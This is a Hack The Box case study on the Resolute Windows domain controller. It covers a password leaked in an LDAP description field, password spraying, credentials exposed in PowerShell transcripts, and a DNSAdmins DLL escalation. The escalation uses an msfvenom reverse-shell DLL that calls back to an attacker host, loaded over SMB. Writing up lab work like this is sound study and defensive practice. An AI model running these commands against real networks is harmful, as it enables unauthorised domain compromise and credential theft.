---
title: "Resolute: LDAP Credential Exposure and DNSAdmins Privilege Escalation"
description: "An LDAP description attribute and PowerShell transcripts expose administrative credentials, then DNSAdmins abuse loads a malicious DLL for SYSTEM."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - credential-exposure
  - dnsadmins
---

## Summary

Resolute is a Medium-difficulty Windows Active Directory machine on Hack The Box. The engagement demonstrates two classes of credential exposure — an LDAP `description` attribute leaking an initial onboarding password, and PowerShell transcript files capturing plaintext administrative credentials — that together enable complete domain compromise. Privilege escalation to SYSTEM exploits `DNSAdmins` group membership to load a malicious DLL into the DNS service process.

All target-specific values (IPs, hostnames, credentials, flags) are replaced with role-based placeholders. Reuse is stated only where the source evidences it.

## Context and Objective

The target is a Windows Server 2019 domain controller running Active Directory for the `<DOMAIN>` domain. Standard AD services are exposed, including WinRM (5985) and DNS (53). The objective is to obtain domain administrator access and retrieve both user and root flags.

## Approach and Evidence

### Stage 1 — LDAP Enumeration and Credential Discovery

The initial enumeration used `enum4linux` against the target to enumerate domain users and attributes.

```bash
enum4linux -a <TARGET_IP> 2>/dev/null | tee enum4linux.out
```

The recorded output revealed a critical finding in the `description` attribute for a provisioning account:

```
user:[<PROVISION_ACCOUNT>]
  Account: <PROVISION_ACCOUNT>   Name: <PROVISION_NAME>   Desc: Account created. Password set to <DEFAULT_PASSWORD>
```

This is a common IT provisioning pattern: setting an initial password and documenting it in the LDAP description field so helpdesk staff can communicate it to new users. The security failure is that this attribute is visible to anonymous or low-privilege enumeration.

The source notes that direct authentication with `<PROVISION_ACCOUNT>:<DEFAULT_PASSWORD>` fails — the password had been changed. However, the provisioning pattern suggests other accounts may still use the default.

### Stage 2 — Password Spraying

Usernames were extracted from the LDAP enumeration and the default onboarding password was sprayed across all accounts:

```bash
enum4linux -U <TARGET_IP> 2>/dev/null | grep "user:" | awk -F: '{print $2}' | tr -d '[]' > users.txt
nxc smb <DOMAIN> -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
```

The recorded output shows a successful authentication:

```
[+] <DOMAIN>\<USER_2>:<DEFAULT_PASSWORD>
```

The `<USER_2>` account retained the default onboarding password and had not changed it, granting an authenticated foothold.

### Stage 3 — Initial Access via WinRM

With valid credentials, a WinRM session was established:

```bash
evil-winrm -i <TARGET_IP> -u '<USER_2>' -p '<DEFAULT_PASSWORD>'
```

The notes report a successful `Pwn3d!` indicator and user result retrieval from `<USER_RESULT_FILE>`.

### Stage 4 — Post-Exploitation: PowerShell Transcript Forensics

Post-exploitation enumeration discovered a PowerShell transcript directory:

```
C:\PSTranscripts\<TIMESTAMP>\
```

PowerShell transcripts capture every command typed in an interactive session. The recovered transcript contained a `net use` command with plaintext credentials:

```powershell
*> net use X: \\fs01\backups <USER_3> <USER_3_PASSWORD>
```

The transcript logged the command-line argument verbatim, exposing `<USER_3>`'s password in cleartext. Credential validation confirmed the account:

```bash
nxc smb <DOMAIN> -u '<USER_3>' -p '<USER_3_PASSWORD>'
```

The recorded output shows `[Pwn3d!]` access, confirming administrative privileges.

### Stage 5 — BloodHound Analysis

BloodHound enumeration mapped the Active Directory attack path:

```bash
bloodhound-ce-python -d <DOMAIN> -u '<USER_3>' -p '<USER_3_PASSWORD>' -c all -ns <TARGET_IP>
```

The key finding: `<USER_3>` is a member of `CONTRACTORS`, which is nested into `DNSADMINS`. This group membership provides the privilege escalation vector.

### Stage 6 — DNSAdmins DLL Injection

The `DNSAdmins` group can configure the DNS service to load a plugin DLL at service startup or restart. The DNS service runs as `NT AUTHORITY\SYSTEM`, so any loaded DLL executes at SYSTEM privilege.

**Step 1 — Generate the malicious DLL:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o <PAYLOAD_DLL>
```

**Step 2 — Host the DLL on an SMB share:**

```bash
sudo impacket-smbserver share . -smb2support
```

**Step 3 — Configure the DNS plugin:**

```bash
dnscmd localhost /config /serverlevelplugindll \\<ATTACKER_IP>\share\<PAYLOAD_DLL>
sc.exe stop dns
sc.exe start dns
```

**Step 4 — Catch the SYSTEM shell:**

```bash
nc -lvnp <PORT>
```

The notes report a connection from the target and SYSTEM-level access, with elevated result retrieval from `<ELEVATED_RESULT_FILE>`.

## Challenges and Decisions

The source documents a direct authentication failure with the leaked password for `<PROVISION_ACCOUNT>` — the account had been rotated. The decision to spray the default password across all enumerated accounts was the critical pivot: the provisioning pattern meant other accounts likely retained the initial credential. The `<USER_2>` account was the successful target.

The DNSAdmins escalation required no software exploit — it is an intentional design feature. The challenge was identifying the group membership chain (`CONTRACTORS` → `DNSADMINS`) through BloodHound analysis.

## Outcome

The engagement achieved complete domain compromise through two independent credential exposure classes:

1. **LDAP attribute disclosure**: An onboarding password documented in the `description` field enabled initial authenticated access via password spraying.
2. **PowerShell transcript exposure**: Administrative credentials captured in plaintext transcripts provided the privilege escalation path.

No software vulnerabilities were exploited. The DNSAdmins DLL injection is a documented design capability, not a CVE. Both flags were obtained.

## Lessons and Recommendations

- **Never document initial passwords in LDAP `description` or `info` fields.** These attributes are world-readable. Initial credentials should be delivered via a secure out-of-band channel and forced to change at first login. Audit LDAP attributes for credential content using automated tooling.

- **Restrict or disable PowerShell transcript logging for interactive sessions.** If enabled for compliance, the transcript storage location should be write-only for users and readable only by a centralized log management system. Credentials should never be passed as command-line arguments; `Get-Credential` and secure string objects should be used instead.

- **Treat `DNSAdmins` membership as equivalent to Domain Admin.** The DLL injection path is a known design limitation. Limit membership to dedicated DNS administration accounts. Monitor changes to the `ServerLevelPluginDll` registry value as a detection mechanism.

- **Default onboarding passwords must be rotated immediately.** The spraying success indicates that password-change policies were not enforced for all accounts. Implement mandatory first-login password rotation and verify completion.

## References

- Hack The Box: [Resolute](https://app.hackthebox.com/machines/Resolute)
